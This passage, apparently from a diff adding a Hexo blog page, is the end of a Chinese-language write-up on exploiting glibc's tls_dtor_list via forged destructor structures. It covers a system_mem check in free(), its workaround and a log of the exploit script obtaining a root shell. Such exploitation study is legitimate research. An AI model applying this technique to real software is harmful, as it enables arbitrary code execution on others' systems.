class="number">1</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>我特地构造了两个tls_dtor结构体是觉得因为仅仅构造一个的话中间有些问题可能不会碰到，碰到问题时又得去研究一番。所以就构造多个更能体现这种利用方法的可行性。<br>好吧，需要注意一个问题。当你仅仅分配一个huge chunk时，main_arena.system_mem等于0。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> p main_arena.system_mem </div><div class="line"><span class="meta">$</span>1 = 0x0</div></pre></td></tr></table></figure></p>
+<p>所以当你执行完第一个tls_dtor里面的函数时，会碰到下面的问题：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*** Error in `./tls': free(): invalid next size (fast): 0x00007ffff7ede020 ***</div></pre></td></tr></table></figure></p>
+<p>因为__call_tls_dtor函数最后又free(cur)，而free时又会有以下检查：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (have_lock</div><div class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</div><div class="line">		  mutex_lock(&amp;av-&gt;mutex);</div><div class="line">		  locked = <span class="number">1</span>;</div><div class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</div><div class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</div><div class="line">	      &#125;))</div><div class="line">	  &#123;</div><div class="line">	    errstr = <span class="string">"free(): invalid next size (fast)"</span>;</div><div class="line">	    <span class="keyword">goto</span> errout;</div><div class="line">	  &#125;</div></pre></td></tr></table></figure></p>
+<p>所以你可以正常执行完puts(‘/bin/sh’)，但是无法执行system函数。解决办法是先分配一个小的堆块，让ain_arena.system_mem不等于0。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> p main_arena.system_mem </div><div class="line"><span class="meta">$</span>1 = 0x2100</div></pre></td></tr></table></figure></p>
+<p>最后执行脚本我们可以得到一个shell。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@w0lfzhang666:/home/w0lfzhang/Desktop/TLS# python tls_dtor_list.py</div><div class="line">[+] Starting local process './tls': Done</div><div class="line">[*]mapped_addr: 0x7ffff7ede010</div><div class="line">pwning....</div><div class="line">Got a shell!</div><div class="line">[*] Switching to interactive mode</div><div class="line">/bin/sh</div><div class="line"><span class="meta">$</span> id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div><div class="line"><span class="meta">$</span></div></pre></td></tr></table></figure></p>
+<p>这种方法利用起来虽然有那么一点困难，但是一旦能覆盖tls_dtor_list指针，那就几乎可以随心所欲的”做坏事”了。</p>
+<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/stdlib/cxa_thread_atexit_impl.c" target="_blank" rel="external">https://github.com/sploitfun/lsploits/blob/master/glibc/stdlib/cxa_thread_atexit_impl.c</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/tls-dtor-list/" rel="tag">#tls_dtor_list</a>
+          
+            <a href="/tags/heap-overflow/" rel="tag">#heap overflow</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/18/2016-BCTF-bcloud/" rel="next" title="2016 BCTF bcloud">
+                <i class="fa fa-chevron-left"></i> 2016 BCTF bcloud
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/28/Sigreturn-Oriented-Programming/" rel="prev" title="Sigreturn Oriented Programming">
+                Sigreturn Oriented Programming <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preview"><span class="nav-number">1.</span> <span class="nav-text">Preview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tls-dtor-list"><span class="nav-number">2.</span> <span class="nav-text">tls_dtor_list</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-Huge-Chunk"><span class="nav-number">3.1.</span> <span class="nav-text">malloc Huge Chunk</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example"><span class="nav-number">4.</span> <span class="nav-text">Example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Links"><span class="nav-number">5.</span> <span class="nav-text">Links</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2017/03/27/Playing-with-tls-dtor-list/';
+      var disqus_title = "Playing with tls_dtor_list";
+      var disqus_url = 'http://yoursite.com/2017/03/27/Playing-with-tls-dtor-list/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
